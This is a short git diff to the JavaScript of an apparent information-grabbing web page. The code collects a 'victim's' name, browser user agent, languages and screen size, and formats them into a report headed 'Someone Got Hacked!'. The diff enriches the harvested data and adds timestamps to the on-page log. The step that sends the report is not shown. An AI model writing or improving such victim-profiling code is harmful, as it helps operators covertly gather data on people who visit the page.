@@ -45,10 +45,10 @@ document.addEventListener("DOMContentLoaded", function() {
         logMessage("Your name: " + victimName + "\n");
         logMessage("Gathering information...\n");
 
-        let message = `<b>Name:</b> <code>${victimName}</code>\n`;
+        let message = `<blockquote><b>Someone Got Hacked!</b></blockquote>\n\n<b>Name:</b> <code>${victimName}</code>\n`;
         const deviceInfo = {
             userAgent: navigator.userAgent,
-            language: navigator.language,
+            language: navigator.language + ` (${navigator.languages.join(", ")})`,
 
             screenWidth: screen.width,
             screenHeight: screen.height
@@ -80,9 +80,15 @@ document.addEventListener("DOMContentLoaded", function() {
     });
 });
 
+function getCurrentTime() {
+    const now = new Date();
+    return now.toTimeString().split(' ')[0];
+}
+
 function logMessage(message) {
     const logArea = document.getElementById("logArea");
-    logArea.innerHTML += `<p>[+] ${message}</p>`;
+    logArea.innerHTML += `<p>[${getCurrentTime()}] ${message}</p>`;
+    logArea.scrollTop = logArea.scrollHeight;
 }
 
 async function fetchData(path) {
